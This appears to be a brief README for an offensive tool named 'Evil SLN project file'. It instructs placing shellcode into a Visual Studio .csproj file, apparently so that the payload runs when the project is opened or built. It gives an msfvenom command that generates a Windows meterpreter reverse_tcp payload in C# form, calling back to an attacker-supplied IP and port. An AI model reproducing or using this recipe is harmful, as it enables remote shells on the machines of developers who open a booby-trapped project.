# Evil SLN project file

change the shellcode in ConsoleApplication1/ConsoleApplication1.csproj

## generate shellcode

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ur-ip> LPORT=<ur-port> -f csharp  

